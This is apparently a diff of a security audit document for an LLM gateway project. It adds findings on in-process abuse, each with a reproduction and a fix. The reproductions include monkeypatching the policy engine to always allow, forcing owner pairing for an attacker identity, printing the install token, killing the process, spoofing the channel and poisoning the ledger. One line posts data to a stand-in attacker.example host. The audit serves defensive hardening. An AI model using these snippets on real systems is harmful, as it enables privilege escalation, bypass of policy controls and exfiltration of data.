@@ -31,19 +31,6 @@ openapi_url=None if PRODUCTION_MODE else "/openapi.json"
 
 Attackers must not be able to enumerate API capabilities or sensitive route metadata in production.
 
-## Verification After Fix
-
-The following endpoints now return:
-
-```json
-{"detail":"Not Found"}
-```
-
-Endpoints verified:
-
-- https://rainitover--glc-v1-gateway-fastapi-app.modal.run/redoc
-- https://rainitover--glc-v1-gateway-fastapi-app.modal.run/openapi.json
-- https://rainitover--glc-v1-gateway-fastapi-app.modal.run/docs
 
 ## 2.Require Bearer Token for Sensitive Operational Endpoints
 
@@ -88,13 +75,6 @@ async def _gateway_auth_middleware(request: Request, call_next):
 
 Attackers must not be able to access provider/capability/status metadata in production without a valid bearer token.
 
-## Verification After Fix
-
-Without Authorization header, the following endpoints now return:
-
-```json
-{"detail":"missing bearer token (Authorization: Bearer <gateway_token>)"}
-```
 
 ## 3. Unauthenticated LLM Abuse
 
@@ -136,14 +116,6 @@ async def _gateway_auth_middleware(request: Request, call_next):
 ## Security Invariant
 
 Attackers must not be able to trigger LLM inference or consume provider quota in production without a valid bearer token.
-
-## Verification After Fix
-
-Without Authorization header, LLM routes now return:
-
-```json
-{"detail":"missing bearer token (Authorization: Bearer <gateway_token>)"}
-```
 
 ## 4. Unauthenticated URL Fetch (SSRF) via Image URL Resolution
 
@@ -187,25 +159,6 @@ if redirect:
 ## Security Invariant
 
 User-controlled URL fetches must never reach loopback/private/link-local/internal destinations, and redirect chains must not bypass destination validation.
-
-## Verification After Fix
-
-Validated with focused tests:
-
-- `tests/test_image_url_ssrf.py::test_image_fetch_rejects_without_allowlist`
-- `tests/test_image_url_ssrf.py::test_image_fetch_blocks_private_ipv4_even_with_wildcard`
-- `tests/test_image_url_ssrf.py::test_image_fetch_blocks_ipv6_loopback`
-- `tests/test_image_url_ssrf.py::test_image_fetch_rechecks_destination_on_redirect`
-
-Command:
-
-```powershell
-uv run pytest tests/test_image_url_ssrf.py tests/test_v9_compat.py::test_chat_request_minimal_body_validates
-```
-
-Observed result:
-
-- All tests passed, confirming allowlist enforcement, IPv4/IPv6 private-range blocking, and redirect-hop re-validation.
 
 ## 5. Tenant Scoping for Usage and Cost Read Endpoints
 
@@ -360,6 +313,309 @@ Files changed:
 ## Security Invariant
 
 Components must not be able to edit or delete their own audit logs.
+
+## 3. Escalate to owner (Leak 3)
+
+## Finding
+
+Owner bootstrap helper `force_pair_owner(...)` was callable from in-process code. In a shared-process model, a malicious in-process component could force owner pairing directly.
+
+## Reproduction
+
+```python
+from glc.security.pairing import get_pairing_store
+get_pairing_store().force_pair_owner("telegram", "attacker-id", user_handle="me")
+```
+
+Observed result (before fix):
+
+- Call succeeded and created `owner_paired` trust for attacker-controlled identity.
+
+## Partial Fix Implemented
+
+Added production guardrails around `force_pair_owner(...)` in `glc/security/pairing.py`:
+
+- In `GLC_ENV=production|prod`, `force_pair_owner` is blocked by default.
+- Explicit override required: `GLC_ALLOW_FORCE_PAIR_OWNER=1`.
+- Added tests in `tests/test_pairing_force_owner_guard.py`.
+
+## Security Invariant
+
+Every action must be checked against the actual user, tenant, and final arguments.
+
+
+## 4. Read the install token (Leak 4)
+
+## Finding
+
+Installer-token export was reachable from the same Python process boundary. In a shared-process design, any in-process component can potentially invoke token-export logic and obtain installer credentials.
+
+## Reproduction
+
+Command:
+
+```powershell
+uv run glc token
+```
+
+Observed result (before fix):
+
+- The command printed the install token even in production-like runtime.
+
+## Partial Fix Implemented
+
+Added a guarded token-export path so installer token display is blocked by default in production:
+
+- Added `get_install_token_for_display()` in `glc/config.py`.
+- Guard condition:
+	- when `GLC_ENV=production` (or `prod`), token export is denied unless `GLC_ALLOW_TOKEN_EXPORT=1`.
+- Updated `glc token` command in `glc/cli.py` to call the guarded helper.
+- Added tests in `tests/test_cli_token_guard.py` for both blocked and override-allowed behavior.
+
+## Security Invariant
+
+Installer-token export must be explicitly opt-in in production runtime and must not be available by default.
+
+## 5. Disable Policy Engine (Leak 5)
+
+## Reproduce
+
+```python
+import glc.policy.engine as e
+from glc.policy.schemas import PolicyVerdict
+e.evaluate = lambda *a, **k: PolicyVerdict(action="allow", reason="pwned")
+```
+
+## Invariant Broken
+
+Policy decisions must not be bypassable via in-process monkeypatching in production runtime.
+
+External content must always be treated as data, never as instructions.
+
+## Fix
+
+Added a production tamper guard in `glc/policy/engine.py` that blocks reassignment of module-level `evaluate` by default:
+
+- Guard is active when `GLC_ENV=production|prod` (or `GLC_PRODUCTION=1`).
+- Monkeypatch override requires explicit opt-in: `GLC_ALLOW_POLICY_MONKEYPATCH=1`.
+
+## 6. Network egress from in-process adapters (Leak 6)
+
+## Finding
+
+Channel/adapter code shares process and network privileges with the gateway in the default model. A compromised adapter could initiate arbitrary outbound connections and exfiltrate data to attacker-controlled infrastructure.
+
+## Reproduce
+
+Representative abuse path:
+
+```python
+# example malicious behavior inside adapter/runtime code
+import httpx
+httpx.post("https://attacker.example/exfil", json={"sample": "sensitive-data"})
+```
+
+Observed risk (before fix):
+
+- No adapter-specific egress policy boundary at runtime.
+- Adapter code could use broad outbound network access from the gateway trust domain.
+
+## Invariant Broken
+
+Untrusted or compromised adapter execution must not have unrestricted outbound network access.
+
+## Partial Fix Implemented
+
+Added Modal Sandbox launcher in `modal_app.py` to run adapters in an isolated runtime with outbound network restrictions:
+
+- New `launch_adapter_sandbox(...)` function creates a sandboxed adapter process.
+- Enforced `outbound_domain_allowlist` so sandbox egress is limited to approved LLM provider domains.
+- Added `LLM_PROVIDER_EGRESS_ALLOWLIST` with provider API domains used by the gateway.
+- Sandbox keeps existing mounted data volume and secrets wiring, but with constrained outbound destination policy.
+
+Allowed domains currently configured:
+
+- `generativelanguage.googleapis.com`
+- `api.groq.com`
+- `integrate.api.nvidia.com`
+- `api.cerebras.ai`
+- `openrouter.ai`
+- `models.github.ai`
+
+## Residual Risk / Scope Note
+
+This is a partial hardening step. It introduces a process/network boundary for adapters launched via the sandbox path, but full protection depends on routing all relevant adapter execution through this sandboxed path and maintaining a tight allowlist over time.
+
+## 7. Unrestricted subprocess and shell access (Leak 7)
+
+## Finding
+
+The `whisper_cpp` speech-to-text slot shells out to a `whisper-cli` binary via subprocess execution:
+
+```python
+subprocess.run([cli, "-m", model, "-f", audio_path, "-oj"])
+```
+
+In a monolithic runtime, adapter code can invoke subprocesses and installed binaries from the same trust boundary as the gateway.
+
+## Invariant Broken
+
+Compromised or untrusted adapter components must not be able to execute arbitrary binaries with gateway-level privileges.
+
+## Status
+
+Partial fix implemented (not closed).
+
+## Partial Fix Implemented
+
+Hardened the Modal adapter launcher path in `modal_app.py` to reduce subprocess/shell abuse blast radius:
+
+- Removed arbitrary `command` override from `launch_adapter_sandbox(...)`.
+- Added `ADAPTER_MODULE_ALLOWLIST` so only known adapter modules can be launched.
+- Forced adapter entrypoint to `python -I -m <allowed_module>`.
+- Added adapter-specific network policy:
+	- default: `outbound_domain_allowlist` for approved provider domains
+	- strict no-egress mode (`block_network=True`) for selected local adapters (`local_mic`)
+
+## Required Fix Direction
+
+The robust fix is defense in depth with component isolation, not a single control:
+
+- Per-component minimal images
+- Sandbox/process isolation per adapter/component
+- Non-root execution
+- Read-only filesystems
+- System-call filtering
+- Strict outbound egress limits
+
+## Scope Note
+
+Removing the shell alone is not sufficient. A Python process can still execute installed binaries and open sockets directly, so process isolation plus runtime policy controls are required together.
+
+## 8. Kill the gateway process from inside runtime (Leak 8)
+
+## Finding
+
+In a shared process boundary, adapter/runtime code can terminate the hosting process directly with OS signals.
+
+## Reproduce
+
+```python
+import os, signal
+os.kill(os.getpid(), signal.SIGTERM)
+```
+
+Observed risk (before isolation change):
+
+- If attacker-controlled logic executes inside the same process boundary as the gateway, it can terminate the gateway process.
+
+## Invariant Broken
+
+Every run must have hard limits on time, tokens, tool calls, and cost.
+
+## Status
+
+Partial fix implemented (not closed).
+
+## Partial Fix Implemented
+
+Strengthened process isolation in `modal_app.py`:
+
+- Split runtime boundaries into `gateway_image` and `adapter_image`.
+- Launched adapter sandboxes under a dedicated app namespace (`glc-v1-adapters`) via `modal.App.lookup(...)`.
+- Adapter execution now runs in separate sandbox containers, so `os.kill(os.getpid(), ...)` in adapter code targets the adapter container process, not the gateway server process.
+
+## Residual Risk / Scope Note
+
+This mitigation depends on routing adapter execution through the sandboxed path. Any code path that still executes untrusted adapter logic in the gateway process remains in scope until fully isolated.
+
+## 9. Cross-channel envelope spoofing (Leak 9)
+
+## Finding
+
+The channel envelope contains a caller-controlled `channel` field. Before the fix, route handlers trusted this field even when it did not match the route channel (`/v1/channels/{name}`), enabling cross-channel spoofing.
+
+Impact:
+
+- A client connected to one channel route could submit an envelope claiming a different channel.
+- Policy, allowlist, rate limit, and audit paths could be evaluated/logged under spoofed channel context.
+
+## Reproduce
+
+WebSocket example:
+
+1. Connect to `/v1/channels/telegram`.
+2. Send envelope payload with `"channel": "discord"`.
+
+Webhook example:
+
+1. POST to `/v1/channels/telegram/webhook`.
+2. Adapter returns `ChannelMessage(channel="discord", ...)`.
+
+Observed risk (before fix):
+
+- Route channel and envelope channel could diverge without a hard reject.
+
+## Invariant Broken
+
+Every action must be checked against the actual user, tenant, and final arguments.
+
+## Fix Implemented
+
+Updated `glc/routes/channels.py` to enforce strict channel binding:
+
+- In WebSocket handler:
+	- validate `env.channel == name`
+	- on mismatch: append `channel_spoof_drop` audit event, send error, close socket with policy violation (`1008`)
+- In webhook handler:
+	- validate `msg.channel == name`
+	- on mismatch: append `channel_spoof_drop` audit event and return `400 {"error": "envelope channel mismatch"}`
+
+## 10. Cost-ledger poisoning via unvalidated ledger writes (Leak 10)
+
+## Finding
+
+The worker-call ledger accepted unvalidated values in `glc.db.log_call(...)`. An attacker-controlled in-process caller could write fabricated token counts and poison `/v1/cost/by_agent` and related analytics.
+
+## Reproduce
+
+```python
+import glc.db
+glc.db.log_call(provider="gemini", model="x", input_tokens=999_999_999, agent="victim")
+```
+
+Observed risk (before fix):
+
+- Oversized/fabricated token counts were accepted and persisted.
+- Ledger aggregates could be skewed by malicious or invalid writes.
+
+## Invariant Broken
+
+Usage and cost telemetry must be derived from validated inputs and must reject malformed or out-of-range accounting values.
+
+## Fix Implemented
+
+Added input validation in `glc/db.py` before insert:
+
+- Required non-empty strings for `provider` and `model`.
+- Added integer type checks and bounded ranges for:
+	- `input_tokens`, `output_tokens`, `cache_create_tokens`, `cache_read_tokens` (max `10_000_000`)
+	- `latency_ms` (max `3_600_000`)
+	- `prompt_chars`, `response_chars` (max `5_000_000`)
+	- `tool_calls` (max `10_000`)
+	- `retries` (max `100`)
+	- `embed_dim` when present (min `1`, max `1_000_000`)
+- Invalid writes now fail fast with `ValueError` and are not persisted.
+
+## Residual Risk / Scope Note
+
+This closes unbounded-value poisoning, but does not cryptographically attest provenance of every in-process ledger write. Full integrity requires stronger provenance controls or process isolation for untrusted writers.
+
+
+
+
+
+
 
 
 
